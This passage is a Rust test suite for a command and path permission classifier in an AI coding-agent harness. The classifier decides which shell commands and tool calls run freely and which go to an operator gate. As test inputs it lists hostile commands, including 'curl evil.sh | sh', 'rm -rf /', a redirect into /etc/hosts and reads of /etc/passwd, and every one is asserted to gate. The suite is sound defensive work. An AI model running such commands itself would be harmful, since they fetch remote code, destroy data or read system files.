            simple_command_tokens("git diff HEAD~1"),
            Some(vec!["git".into(), "diff".into(), "HEAD~1".into()])
        );
    }

    #[test]
    fn operators_and_redirections_are_not_simple() {
        for complex in [
            "git diff | rm -rf x",
            "cargo build && rm -rf /",
            "cargo build; echo done",
            "cargo build &",
            "! cargo build",
            "git diff > /etc/hosts",
            "cat < input",
            "echo $(rm x)",
            "echo `rm x`",
            "echo $((1+1))",
        ] {
            assert_eq!(
                simple_command_tokens(complex),
                None,
                "{complex:?} must gate"
            );
        }
    }

    /// A file-descriptor duplication/closure (`2>&1`, `>&2`, `2>&-`, `<&3`) is *not* a file
    /// redirection: it only rewires the process's own descriptors, touching no filesystem, so it
    /// stays structurally simple and its literal words still lex to the program tokens. This is the
    /// habitual `cmd 2>&1` the model appends — it must not knock a blanket-allowlisted program off
    /// the fast path (the dogfood regression: `cargo test 2>&1` gated despite `cargo` being blanket).
    #[test]
    fn fd_duplications_are_simple_and_lex_to_the_program_tokens() {
        // The redir words are *not* part of the token vector — only `simple.words` are.
        assert_eq!(
            simple_command_tokens("cargo test 2>&1"),
            Some(vec!["cargo".into(), "test".into()])
        );
        assert_eq!(
            simple_command_tokens("ferritin get efference::log::LogEntry 2>&1"),
            Some(vec![
                "ferritin".into(),
                "get".into(),
                "efference::log::LogEntry".into()
            ])
        );
        // fd-close and input-side dup are equally inert.
        assert_eq!(
            simple_command_tokens("cargo build 2>&-"),
            Some(vec!["cargo".into(), "build".into()])
        );
        assert_eq!(
            simple_command_tokens("cat foo <&3"),
            Some(vec!["cat".into(), "foo".into()])
        );
        // …and the blanket allowlist therefore clears them.
        assert_eq!(verdict("cargo test 2>&1"), Verdict::Clear);
    }

    /// The fd-dup carve-out is *only* for descriptor operands (a number or `-`). A `>&` whose operand
    /// is a filename or an expansion is still a filesystem-touching redirection and must gate.
    #[test]
    fn fd_dup_carve_out_does_not_leak_to_file_redirections() {
        for still_gates in [
            "cargo build > out.log",  // truncating file redirect
            "cargo build >> out.log", // appending file redirect
            "cargo build 2> err.log", // stderr to a file
            "cargo build &> all.log", // bash both-streams (parses as bg + redir here)
            "cat <<< hello",          // here-string
            "cargo build >& out.log", // `>&` to a *filename*, not an fd
            "cargo build 2>&$FD",     // expanded operand
        ] {
            assert_eq!(
                simple_command_tokens(still_gates),
                None,
                "{still_gates:?} must gate — it is not a pure fd duplication"
            );
        }
    }

    #[test]
    fn promotable_command_accepts_a_lexable_novel_prefix() {
        let role = sample_role(); // cargo, rg, git diff, git status
        // A program not yet listed, structurally simple → promotable, stored trimmed.
        assert_eq!(
            promotable_command(&role, "  npm  "),
            Some("npm".to_string())
        );
        // A sub-verb prefix the allowlist doesn't cover (only `git diff`/`git status` are listed).
        assert_eq!(
            promotable_command(&role, "git log"),
            Some("git log".to_string())
        );
    }

    #[test]
    fn promotable_command_rejects_unlexable_or_redundant_prefixes() {
        let role = sample_role();
        // Doesn't lex to a simple command (operator) → never queued: program-prefix granularity.
        assert_eq!(promotable_command(&role, "npm | sh"), None);
        // Already a listed program → redundant.
        assert_eq!(promotable_command(&role, "cargo"), None);
        // Covered by a broader listed key: `git diff` is already cleared by... no — `git` is NOT
        // listed, only `git diff`/`git status`, so `git diff --stat` IS covered by `git diff`.
        assert_eq!(promotable_command(&role, "git diff --stat"), None);
        // But promoting the *broader* `git` is a real broadening, not redundant.
        assert_eq!(promotable_command(&role, "git"), Some("git".to_string()));
    }

    #[test]
    fn expansions_and_globs_are_not_simple() {
        for complex in [
            "echo $HOME",          // parameter expansion
            "echo ${PATH}",        // braced parameter
            "cat ~/secrets",       // leading tilde
            "rg pattern src/*.rs", // unquoted glob
            "rm file?",            // unquoted glob
            "cp {a,b} dest",       // brace expansion
            "CORPUS=x cargo test", // env-assignment prefix (the trillium cruft entry)
        ] {
            assert_eq!(
                simple_command_tokens(complex),
                None,
                "{complex:?} must gate"
            );
        }
    }

    /// The case that proves a *real lexer* is required: the `|` is inside single quotes,
    /// so it is one literal argument to `rg`, not a pipe. A regex over the string would
    /// wrongly gate it.
    #[test]
    fn quoted_metacharacters_stay_literal() {
        assert_eq!(
            simple_command_tokens("rg -n 'fn foo|fn bar' src/"),
            Some(vec![
                "rg".into(),
                "-n".into(),
                "fn foo|fn bar".into(),
                "src/".into()
            ])
        );
        assert_eq!(verdict("rg -n 'fn foo|fn bar' src/"), Verdict::Clear);
    }

    // --- Stage 2: prefix match, only reached for structurally-simple commands ---

    #[test]
    fn blanket_program_clears_any_args() {
        assert_eq!(verdict("cargo build"), Verdict::Clear);
        assert_eq!(verdict("cargo test --workspace --release"), Verdict::Clear);
    }

    #[test]
    fn sub_verb_prefix_clears_only_the_named_verb() {
        assert_eq!(verdict("git diff --stat src/"), Verdict::Clear);
        assert_eq!(verdict("git status"), Verdict::Clear);
        // The whole point of sub-verb granularity: the irreversible verbs fall through.
        assert_eq!(verdict("git push"), Verdict::Gate);
        assert_eq!(verdict("git reset --hard"), Verdict::Gate);
    }

    #[test]
    fn unlisted_program_gates() {
        assert_eq!(verdict("npm install"), Verdict::Gate);
        assert_eq!(verdict("./benchmarks/run.sh baseline"), Verdict::Gate);
    }

    /// Stage 1 runs first: a structurally-complex command with an allowlisted program
    /// still gates — the trusted `git diff` prefix can't rescue a redirection.
    #[test]
    fn structural_check_precedes_prefix_match() {
        assert_eq!(verdict("git diff > /etc/hosts"), Verdict::Gate);
        assert_eq!(verdict("cargo build && curl evil.sh | sh"), Verdict::Gate);
    }

    // --- Structured tools: name grant + path-perm, interpreted from config ---

    use crate::config::Perms;

    fn call(name: &str, input: Value) -> ToolCall {
        ToolCall {
            id: CallId("toolu_s".into()),
            name: name.into(),
            input,
        }
    }

    /// A fixed cwd so path resolution is deterministic in tests (no real filesystem).
    const CWD: &str = "/work";

    /// The config-write carve-out (backlog/permissions/session-dir-and-config-as-reviewed-file.md):
    /// a `write`/`edit` whose target resolves to the protected config file is detected (so
    /// the loop forces the operator gate), whether the target is relative or absolute; a write
    /// elsewhere, a *read* of the config, and the path-less `undo_edit` are not.
    #[test]
    fn config_write_carve_out_detects_writes_to_the_protected_file() {
        let cwd = Path::new(CWD);
        let protected = Path::new(".efference/foo/config.toml");

        let rel = call(
            "write",
            serde_json::json!({ "path": ".efference/foo/config.toml" }),
        );
        assert!(
            is_config_write_in(&rel, protected, cwd),
            "relative write to config"
        );

        let abs = call(
            "write",
            serde_json::json!({ "path": "/work/.efference/foo/config.toml" }),
        );
        assert!(
            is_config_write_in(&abs, protected, cwd),
            "absolute write to config"
        );

        let edit = call(
            "edit",
            serde_json::json!({ "file_path": ".efference/foo/config.toml" }),
        );
        assert!(
            is_config_write_in(&edit, protected, cwd),
            "edit names the config"
        );

        let elsewhere = call("write", serde_json::json!({ "path": "src/main.rs" }));
        assert!(
            !is_config_write_in(&elsewhere, protected, cwd),
            "a write elsewhere is not it"
        );

        let read = call(
            "read",
            serde_json::json!({ "paths": ".efference/foo/config.toml" }),
        );
        assert!(
            !is_config_write_in(&read, protected, cwd),
            "reading the config is not a write"
        );

        let undo = call("undo_edit", serde_json::json!({}));
        assert!(
            !is_config_write_in(&undo, protected, cwd),
            "undo_edit carries no path"
        );
    }

    /// A config granting the read/write/daemon tools, with cwd read+write and a **disjoint**
    /// read-only zone outside cwd (`/refs`). Disjoint on purpose: grants are additive with
    /// no sub-deny, so a read-only grant can only restrict where the writable cwd grant
    /// doesn't already reach (see [`path_granted`]).
    fn fs_role() -> Config {
        Config {
            tools: [
                "read",
                "list",
                "search",
                "write",
                "edit",
                "undo_edit",
                "kill_process",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            paths: [
                (
                    ".".to_string(),
                    Perms {
                        read: true,
                        write: true,
                    },
                ),
                (
                    "/refs".to_string(),
                    Perms {
                        read: true,
                        write: false,
                    },
                ),
            ]
            .into_iter()
            .collect(),
            ..Default::default()
        }
    }

    fn structured(role: &Config, c: &ToolCall) -> Verdict {
        classify_in(role, c, Path::new(CWD))
    }

    #[test]
    fn structured_tool_gates_without_a_name_grant() {
        // An empty role grants nothing — every structured tool gates (today's behavior).
        let c = call("read", serde_json::json!({ "paths": ["src/main.rs"] }));
        assert_eq!(structured(&Config::default(), &c), Verdict::Gate);
        // Even with a path grant, an un-granted *name* gates.
        let role = Config {
            paths: [(
                ".".to_string(),
                Perms {
                    read: true,
                    write: true,
                },
            )]
            .into_iter()
            .collect(),
            ..Default::default()
        };
        assert_eq!(structured(&role, &c), Verdict::Gate);
    }

    #[test]
    fn read_clears_under_a_read_grant_and_gates_outside_it() {
        let role = fs_role();
        // Under cwd → granted.
        assert_eq!(
            structured(
                &role,
                &call("read", serde_json::json!({ "paths": ["src/main.rs"] }))
            ),
            Verdict::Clear
        );
        // Absolute path outside any grant → gated.
        assert_eq!(
            structured(
                &role,
                &call("read", serde_json::json!({ "paths": ["/etc/passwd"] }))
            ),
            Verdict::Gate
        );
        // `..` escaping the cwd grant → gated (lexical normalization catches it).
        assert_eq!(
            structured(
                &role,
                &call("read", serde_json::json!({ "paths": ["../../etc/passwd"] }))
            ),
            Verdict::Gate
        );
    }

    #[test]
    fn read_with_multiple_paths_needs_all_granted() {
        let role = fs_role();
        // One in-tree, one out-of-tree → the whole call gates.
        let c = call(
            "read",
            serde_json::json!({ "paths": ["src/a.rs", "/etc/hosts"] }),
        );
        assert_eq!(structured(&role, &c), Verdict::Gate);
    }

    #[test]
    fn list_defaults_to_cwd_when_path_omitted() {
        let role = fs_role();
        assert_eq!(
            structured(&role, &call("list", serde_json::json!({}))),
            Verdict::Clear
        );
    }

    #[test]
    fn write_needs_write_permission_not_just_read() {
        let role = fs_role();
        // cwd is read+write → a write under it clears.
        assert_eq!(
            structured(
                &role,
                &call("write", serde_json::json!({ "path": "src/new.rs" }))
            ),
            Verdict::Clear
        );
        // `/refs` is read-only → a write there gates even though reads clear.
        assert_eq!(
            structured(
                &role,
                &call("write", serde_json::json!({ "path": "/refs/x.rs" }))
            ),
            Verdict::Gate
        );
        assert_eq!(
            structured(
                &role,
                &call("read", serde_json::json!({ "paths": ["/refs/x.rs"] }))
            ),
            Verdict::Clear
        );
    }

    #[test]
    fn a_nested_deny_carves_an_exclusion_out_of_an_allowed_parent() {
        // The self-surface stack the harness injects in `serve`: allow `.`, deny the whole
        // `.efference/` base, re-allow read-only on *this* session's `config.toml`. Resolution
        // is longest-prefix-wins, so each target is judged by its most specific grant.
        let role = Config {
            tools: ["read", "write"].iter().map(|s| s.to_string()).collect(),
            paths: [
                (
                    ".".to_string(),
                    Perms {
                        read: true,
                        write: true,
                    },
                ),
                (".efference".to_string(), Perms::default()), // deny
                (
                    ".efference/sess/config.toml".to_string(),
                    Perms {
                        read: true,
                        write: false,
                    }, // re-allow, read only
                ),
            ]
            .into_iter()
            .collect(),
            ..Config::default()
        };
        let read = |p: &str| structured(&role, &call("read", serde_json::json!({ "paths": [p] })));
        let write = |p: &str| structured(&role, &call("write", serde_json::json!({ "path": p })));

        // `.` governs ordinary in-tree work.
        assert_eq!(read("src/main.rs"), Verdict::Clear);
        assert_eq!(write("src/main.rs"), Verdict::Clear);
        // The `.efference/` deny governs the log and the socket — the more specific grant wins
        // over the broader `.` allow, so writing the log or reading it is refused.
        assert_eq!(read(".efference/sess/log.jsonl"), Verdict::Gate);
        assert_eq!(write(".efference/sess/log.jsonl"), Verdict::Gate);
        // This session's own config: readable (the deepest grant re-allows read)…
        assert_eq!(read(".efference/sess/config.toml"), Verdict::Clear);
        // …but not directly writable — the write falls through to the gate, which is the
        // sanctioned scope-expansion path (the operator reviews the proposed edit).
        assert_eq!(write(".efference/sess/config.toml"), Verdict::Gate);
        // Another session's config is under the deny with no re-allow → opaque.
        assert_eq!(read(".efference/other/config.toml"), Verdict::Gate);
    }

    #[test]
    fn edit_pipeline_enforces_write_at_edit_then_undo_clears() {
        let role = fs_role();
        // edit names the file → write enforced here.
        assert_eq!(
            structured(
                &role,
                &call(
                    "edit",
                    serde_json::json!({ "file_path": "src/x.rs", "operation": "replace", "anchor": "fn x" })
                )
            ),
            Verdict::Clear
        );
        // edit into the read-only zone gates (the write is refused up front).
        assert_eq!(
            structured(
                &role,
                &call(
                    "edit",
                    serde_json::json!({ "file_path": "/refs/x.rs", "operation": "replace", "anchor": "fn x" })
                )
            ),
            Verdict::Gate
        );
        // undo_edit carries no path; the name grant suffices (write was authorized at edit).
        assert_eq!(
            structured(&role, &call("undo_edit", serde_json::json!({}))),
            Verdict::Clear
        );
    }

    #[test]
    fn daemon_tool_clears_on_name_grant_alone() {
        let role = fs_role();
        // kill_process has no path; being in the tool grants is enough.
        assert_eq!(
            structured(
                &role,
                &call("kill_process", serde_json::json!({ "handle": "bg-1" }))
            ),
            Verdict::Clear
        );
        // An un-granted daemon tool still gates.
        assert_eq!(
            structured(&role, &call("check_inbox", serde_json::json!({}))),
            Verdict::Gate
        );
    }

    #[test]
    fn missing_or_malformed_required_path_gates() {
        let role = fs_role();
        // `read` requires `paths`; absent → gate.
        assert_eq!(
            structured(&role, &call("read", serde_json::json!({}))),
            Verdict::Gate
        );
        // Empty array → gate (a no-target read shouldn't auto-clear).
        assert_eq!(
            structured(&role, &call("read", serde_json::json!({ "paths": [] }))),
            Verdict::Gate
        );
        // Non-string path → gate.
        assert_eq!(
            structured(&role, &call("write", serde_json::json!({ "path": 42 }))),
            Verdict::Gate
        );
    }

    // --- effective_config: the policy fold over the log's changes ---

    use crate::log::{ConfigChange, ConfigEdit, EditState, LogEntry, Payload, Timestamp};

    /// One config edit in a given lifecycle state, as a log entry (seq/turn/at are irrelevant to
    /// the fold — only `state` gates whether the change takes effect).
    fn edit_entry(state: EditState, change: ConfigChange) -> LogEntry {
        LogEntry {
            seq: 0,
            turn: 0,
            at: Timestamp(0),
            payload: Payload::ConfigEdit(ConfigEdit {
                state,
                resolves: None,
                change,
                note: String::new(),
            }),
        }
    }

    /// The common case: a committed change (the fold applies it).
    fn change_entry(change: ConfigChange) -> LogEntry {
        edit_entry(EditState::Committed, change)
    }

    /// A log with no changes leaves the policy exactly as the base config decides.
    #[test]
    fn effective_config_without_edits_matches_the_base() {
        let base = sample_role();
        let eff = effective_config(&base, &[]);
        // npm is unlisted in the base, so it gates under both the base and the (unchanged) fold.
        assert_eq!(classify(&base, &bash_call("npm install")), Verdict::Gate);
        assert_eq!(classify(&eff, &bash_call("npm install")), Verdict::Gate);
    }

    /// A `Command` change promotes a program the base gated into the fast-path.
    #[test]
    fn a_command_change_clears_a_previously_gated_command() {
        let base = sample_role();
        assert_eq!(classify(&base, &bash_call("npm install")), Verdict::Gate);
        let log = [change_entry(ConfigChange::Command {
            command: "npm".into(),
        })];
        let eff = effective_config(&base, &log);
        assert_eq!(classify(&eff, &bash_call("npm install")), Verdict::Clear);
    }

    /// The lifecycle gate: only a `Committed` edit takes effect. A `Proposed` or `Cancelled`
    /// entry with the *same* change is inert in the fold — it stays out of the effective config
    /// until an orchestrator commits it (backlog/permissions/proposal-lifecycle.md).
    #[test]
    fn only_committed_edits_fold_into_the_effective_config() {
        let base = sample_role();
        let change = ConfigChange::Command {
            command: "npm".into(),
        };
        for state in [EditState::Proposed, EditState::Cancelled] {
            let eff = effective_config(&base, &[edit_entry(state, change.clone())]);
            assert_eq!(
                classify(&eff, &bash_call("npm install")),
                Verdict::Gate,
                "{state:?} must not take effect",
            );
        }
        // The same change, committed, does clear it — proving the gate, not an unrelated miss.
        let eff = effective_config(&base, &[edit_entry(EditState::Committed, change)]);
        assert_eq!(classify(&eff, &bash_call("npm install")), Verdict::Clear);
    }

    /// A structured write needs *both* a tool-name and a path change — two changes fold
    /// together to clear what an empty base gated.
    #[test]
    fn tool_and_path_changes_fold_together_to_clear_a_write() {
        let base = Config::default(); // gates everything
        let c = call("write", serde_json::json!({ "path": "src/x.rs" }));
        assert_eq!(classify_in(&base, &c, Path::new(CWD)), Verdict::Gate);
        let log = [
            change_entry(ConfigChange::Tool {
                name: "write".into(),
            }),
            change_entry(ConfigChange::Path {
                path: ".".into(),
                read: true,
                write: true,
            }),
        ];
        let eff = effective_config(&base, &log);
        assert_eq!(classify_in(&eff, &c, Path::new(CWD)), Verdict::Clear);
    }

    /// The fold stays idempotent under replace-at-key: replaying the same change (e.g. one
    /// already persisted to the config *and* still in the log) lands the same value — setting a
    /// set-member or a path-perm twice is a no-op.
    #[test]
    fn folding_a_change_twice_is_harmless() {
        let base = sample_role();
        let g = change_entry(ConfigChange::Command {
            command: "npm".into(),
        });
        let eff = effective_config(&base, &[g.clone(), g]);
        assert_eq!(classify(&eff, &bash_call("npm install")), Verdict::Clear);
    }

    /// A `Scope` change replaces the effective scope (the slot a session-visible edit moves —
    /// the classifier ignores it, but the spotter reads effective scope directly).
    #[test]
    fn a_scope_change_updates_the_effective_scope() {
        let base = Config::default();
        assert!(base.scope.is_none());
        let log = [change_entry(ConfigChange::Scope {
            text: "new perimeter".into(),
        })];
        let eff = effective_config(&base, &log);
        assert_eq!(eff.scope.as_deref(), Some("new perimeter"));
    }

    // --- prefix-promotion: the probe ledger + descent (backlog/permissions/prefix-promotion.md) ---

    fn toks(command: &str) -> Vec<String> {
        simple_command_tokens(command).expect("lexes")
    }

    /// The frequency gate: a prefix isn't probed until it's been seen `MIN_SIGHTINGS_TO_PROBE` times.
    #[test]
    fn descent_waits_for_the_frequency_gate() {
        let role = Config::default(); // empty allowlist → every prefix is promotable
        let mut ledger = ProbeLedger::default();
        let t = toks("npm install");
        ledger.observe(&t); // 1st sighting
        assert_eq!(
            ledger.next_probe(&role, &t),
            None,
            "one sighting is too few"
        );
        ledger.observe(&t); // 2nd sighting → now eligible
        assert_eq!(ledger.next_probe(&role, &t).as_deref(), Some("npm"));
    }

    /// The descent picks the shortest unresolved prefix, then descends past a not-safe vote.
    #[test]
    fn descent_picks_shortest_then_descends_past_a_vote() {
        let role = Config::default();
        let mut ledger = ProbeLedger::default();
        let t = toks("git log --oneline");
        // Warm all prefixes past the gate.
        ledger.observe(&t);
        ledger.observe(&t);
        // Shortest first: `git`.
        assert_eq!(ledger.next_probe(&role, &t).as_deref(), Some("git"));
        // A not-safe vote resolves `git`; the descent moves to the next prefix, `git log`.
        ledger.vote("git", false);
        assert_eq!(ledger.next_probe(&role, &t).as_deref(), Some("git log"));
        // A safe vote on `git log` resolves it too (and flags it ready to promote).
        ledger.vote("git log", true);
        assert!(ledger.ready_to_promote("git log"));
        assert!(!ledger.ready_to_promote("git"));
        // `git log --oneline` was never warmed on its own past the gate independently... it was
        // (every observe bumps all prefixes), so it's the last eligible one.
        assert_eq!(
            ledger.next_probe(&role, &t).as_deref(),
            Some("git log --oneline")
        );
    }

    /// Coverage is monotonic by token-prefix: if `cargo` is allowlisted, every `cargo …` prefix is
    /// covered too (and the command would fast-path clear, never reaching the spotter). The descent's
    /// coverage check is a defensive guard — when all prefixes are covered it probes nothing.
    #[test]
    fn descent_probes_nothing_when_every_prefix_is_covered() {
        let role = Config {
            commands: commands(&["cargo"]),
            ..Default::default()
        };
        let mut ledger = ProbeLedger::default();
        let t = toks("cargo test --workspace");
        ledger.observe(&t);
        ledger.observe(&t);
        assert_eq!(ledger.next_probe(&role, &t), None);
    }

    /// The fold reconstructs seen-counts (from each `Spot`'s command) and votes (from probed `Spot`s,
    /// model verdicts only) so a resumed daemon picks up exactly where it left off.
    #[test]
    fn probe_ledger_folds_seen_and_votes_from_the_log() {
        use crate::log::{CallId, Origin, Spot, Stance};

        // Two `cargo test` invocations, the second carrying a `clear_always` probe vote for `cargo`.
        fn assistant(id: &str, command: &str) -> LogEntry {
            LogEntry {
                seq: 0,
                turn: 0,
                at: Timestamp(0),
                payload: Payload::Assistant {
                    thinking: vec![],
                    text: vec![],
                    calls: vec![ToolCall {
                        id: CallId(id.into()),
                        name: bash::NAME.into(),
                        input: serde_json::json!({ "command": command }),
                    }],
                },
            }
        }
        fn spot(id: &str, stance: Stance, probed: Option<&str>) -> LogEntry {
            LogEntry {
                seq: 0,
                turn: 0,
                at: Timestamp(0),
                payload: Payload::Spot(Spot {
                    call_id: CallId(id.into()),
                    stance,
                    reason: String::new(),
                    origin: Origin::Model,
                    probed_prefix: probed.map(str::to_string),
                }),
            }
        }

        let log = [
            assistant("a", "cargo test"),
            spot("a", Stance::Clear, Some("cargo")), // 1st sighting, not-safe-yet vote? no — clear, not clear_always
            assistant("b", "cargo test"),
            spot("b", Stance::ClearAlways, Some("cargo")), // 2nd sighting + safe vote
        ];
        let ledger = probe_ledger(&log);
        // Two sightings of `cargo` and `cargo test`.
        let role = Config::default();
        // `cargo` got one not-safe (Clear) and one safe (ClearAlways) vote → resolved either way;
        // and it reached the safe threshold, so it's ready to promote.
        assert!(ledger.ready_to_promote("cargo"));
        // Resolved → not re-probed even though seen ≥ 2.
        assert_eq!(
            ledger.next_probe(&role, &toks("cargo test")).as_deref(),
            Some("cargo test")
        );
    }

    /// A fail-closed (`Fallback`) spotter verdict casts no vote — it didn't actually judge.
    #[test]
    fn probe_ledger_ignores_fallback_verdicts() {
        use crate::log::{CallId, Origin, Spot, Stance};
        let log = [LogEntry {
            seq: 0,
            turn: 0,
            at: Timestamp(0),
            payload: Payload::Spot(Spot {
                call_id: CallId("x".into()),
                stance: Stance::ClearAlways, // would be a safe vote — but origin is Fallback
                reason: String::new(),
                origin: Origin::Fallback,
                probed_prefix: Some("cargo".into()),
            }),
        }];
        let ledger = probe_ledger(&log);
        assert!(
            !ledger.ready_to_promote("cargo"),
            "a fallback casts no vote"
        );
    }

    // --- the [context] clearance rung (docs/context.md) ---

    mod context_rung {
        use super::*;
        use crate::config::{ContextEntry, ContextGrants, ContextSource};

        fn ctx_entry(paths: &[&str], update: bool, create: bool) -> ContextEntry {
            ContextEntry {
                heading: None,
                source: ContextSource::Files(paths.iter().map(|s| s.to_string()).collect()),
                grants: ContextGrants { update, create },
                sort: None,
            }
        }

        fn ctx_role(entries: Vec<ContextEntry>) -> Config {
            Config {
                context: entries,
                ..Default::default()
            }
        }

        /// The headline behavior: a `[context]` listing is itself the read grant. An otherwise
        /// empty role (no `tools`, no `paths`) still fast-path clears a read of the listed file
        /// — that read is exactly what the preamble stub invited.
        #[test]
        fn listing_clears_a_read_with_no_other_grants() {
            let role = ctx_role(vec![ctx_entry(&["docs/verify.md"], false, false)]);
            assert_eq!(
                structured(
                    &role,
                    &call("read", serde_json::json!({ "paths": ["docs/verify.md"] }))
                ),
                Verdict::Clear
            );
            // An unlisted path still gates…
            assert_eq!(
                structured(
                    &role,
                    &call("read", serde_json::json!({ "paths": ["src/main.rs"] }))
                ),
                Verdict::Gate
            );
            // …and one unlisted target poisons a batch (every path must be granted).
            assert_eq!(
                structured(
                    &role,
                    &call(
                        "read",
                        serde_json::json!({ "paths": ["docs/verify.md", "src/main.rs"] })
                    )
                ),
                Verdict::Gate
            );
        }

        /// A location entry (dir) grants read on its whole subtree, by the same lexical rule as
        /// `[paths]` — the caveat the backlog states loudly: the listing is a read grant on
        /// everything under it, not just a mention.
        #[test]
        fn location_entry_clears_reads_under_its_subtree() {
            let role = ctx_role(vec![ctx_entry(&["memories"], false, false)]);
            assert_eq!(
                structured(
                    &role,
                    &call("read", serde_json::json!({ "paths": ["memories/apis.md"] }))
                ),
                Verdict::Clear
            );
            assert_eq!(
                structured(
                    &role,
                    &call("list", serde_json::json!({ "path": "memories" }))
                ),
                Verdict::Clear
            );
            // An escape via `..` normalizes out of the subtree and gates.
            assert_eq!(
                structured(
                    &role,
                    &call(
                        "read",
                        serde_json::json!({ "paths": ["memories/../secrets.md"] })
                    )
                ),
                Verdict::Gate
            );
        }

        /// The dogfood regression: a batched read spanning **both** clearance sources must clear.
        /// One path is covered by a `[paths]` grant (needs the `read` name grant), the other only by
        /// a `[context]` entry (standalone). Neither source covers the *whole* batch alone, so the
        /// old all-or-nothing-per-source check gated it; per-path union clears it, because every path
        /// is granted by *some* source.
        #[test]
        fn a_read_spanning_paths_and_context_clears_per_path() {
            let role = Config {
                tools: ["read"].iter().map(|s| s.to_string()).collect(),
                paths: [(
                    ".".to_string(),
                    Perms {
                        read: true,
                        write: true,
                    },
                )]
                .into_iter()
                .collect(),
                context: vec![ctx_entry(&["/outside/memory"], false, false)],
                ..Default::default()
            };
            // `docs/x.md` is under the `.` [paths] grant; `/outside/memory/note.md` is under the
            // [context] entry. Each path clears via a *different* source; the batch clears.
            assert_eq!(
                structured(
                    &role,
                    &call(
                        "read",
                        serde_json::json!({ "paths": ["docs/x.md", "/outside/memory/note.md"] })
                    )
                ),
                Verdict::Clear
            );
            // Order-independence: the same two paths, swapped, still clear.
            assert_eq!(
                structured(
                    &role,
                    &call(
                        "read",
                        serde_json::json!({ "paths": ["/outside/memory/note.md", "docs/x.md"] })
                    )
                ),
                Verdict::Clear
            );
            // A third path covered by *neither* source still poisons the batch.
            assert_eq!(
                structured(
                    &role,
                    &call(
                        "read",
                        serde_json::json!({ "paths": ["docs/x.md", "/outside/memory/note.md", "/etc/passwd"] })
                    )
                ),
                Verdict::Gate
            );
        }

        /// A read-only listing clears no writes; `update` clears a write to an **existing** file
        /// under the entry; `create` clears a write to a **new** one. `create` without `update`
        /// is the append-only store: add, never rewrite.
        #[test]
        fn write_grants_split_on_existence() {
            let dir =
                std::env::temp_dir().join(format!("efference-policy-ctx-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(dir.join("memories")).unwrap();
            std::fs::write(dir.join("memories/existing.md"), "a fact\n").unwrap();

            let existing = call(
                "write",
                serde_json::json!({ "path": "memories/existing.md" }),
            );
            let fresh = call("write", serde_json::json!({ "path": "memories/new.md" }));

            let read_only = ctx_role(vec![ctx_entry(&["memories"], false, false)]);
            assert_eq!(classify_in(&read_only, &existing, &dir), Verdict::Gate);
            assert_eq!(classify_in(&read_only, &fresh, &dir), Verdict::Gate);

            let update_only = ctx_role(vec![ctx_entry(&["memories"], true, false)]);
            assert_eq!(classify_in(&update_only, &existing, &dir), Verdict::Clear);
            assert_eq!(classify_in(&update_only, &fresh, &dir), Verdict::Gate);

            let append_only = ctx_role(vec![ctx_entry(&["memories"], false, true)]);
            assert_eq!(classify_in(&append_only, &existing, &dir), Verdict::Gate);
            assert_eq!(classify_in(&append_only, &fresh, &dir), Verdict::Clear);

            // The edit pipeline: `edit` names the file (enforced like `write`);
            // `undo_edit` names nothing and clears on any context write grant.
            let edit = call(
                "edit",
                serde_json::json!({ "file_path": "memories/existing.md" }),
            );
            let undo = call("undo_edit", serde_json::json!({}));
            assert_eq!(classify_in(&update_only, &edit, &dir), Verdict::Clear);
            assert_eq!(classify_in(&update_only, &undo, &dir), Verdict::Clear);
            assert_eq!(classify_in(&read_only, &undo, &dir), Verdict::Gate);

            std::fs::remove_dir_all(&dir).unwrap();
        }

        /// An `exec` entry has no files: it grants nothing, read or write.
        #[test]
        fn exec_entry_grants_nothing() {
            let role = ctx_role(vec![ContextEntry {
                heading: Some("Date".into()),
                source: ContextSource::Exec("date".into()),
                grants: ContextGrants::default(),
                sort: None,
            }]);
            assert_eq!(
                structured(
                    &role,
                    &call("read", serde_json::json!({ "paths": ["date"] }))
                ),
                Verdict::Gate
            );
        }

        /// The rung never reaches beyond the known path-bearing tools: an unrelated structured
        /// tool (or bash) is untouched by `[context]` and follows the ordinary rules.
        #[test]
        fn unrelated_tools_are_untouched() {
            let role = ctx_role(vec![ctx_entry(&["docs"], true, true)]);
            assert_eq!(
                structured(&role, &call("kill_process", serde_json::json!({ "id": 1 }))),
                Verdict::Gate
            );
            assert_eq!(
                structured(
                    &role,
                    &call("bash", serde_json::json!({ "command": "cat docs/x.md" }))
                ),
                Verdict::Gate,
                "bash never clears via a context listing — only the structured read path"
            );
        }
    }
}
